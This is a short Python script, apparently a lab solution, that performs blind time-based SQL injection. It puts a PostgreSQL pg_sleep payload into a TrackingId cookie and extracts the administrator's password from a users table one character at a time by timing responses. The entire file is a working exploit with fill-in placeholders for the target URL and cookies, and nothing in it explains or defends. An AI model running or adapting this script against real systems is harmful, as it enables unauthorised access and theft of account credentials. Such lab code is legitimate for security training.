import requests
import string
import time

url = "<URL-HERE>"
session_cookie = "SESSION_COOKIE-HERE"

charset = string.ascii_lowercase + string.digits 

password = ""

for position in range(1, 21):
    found = False
    for char in charset:
        payload = f"<TrackingId-here>'||(SELECT CASE WHEN (username='administrator' AND substring(password,{position},1)='{char}') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users)-- "

        cookies = {"TrackingId": payload, "session": session_cookie}

        start = time.time()
        r = requests.get(url, cookies=cookies)
        elapsed = time.time() - start

        if elapsed > 3:
            password += char
            print(f"[+] Position {position}: Found '{char}' → {password}")
            found = True
            break

    if not found:
        print(f"[-] Position {position}: No match at pos {position}, stopping.")
        break

print(f"\n[✔] Extracted password: {password}")
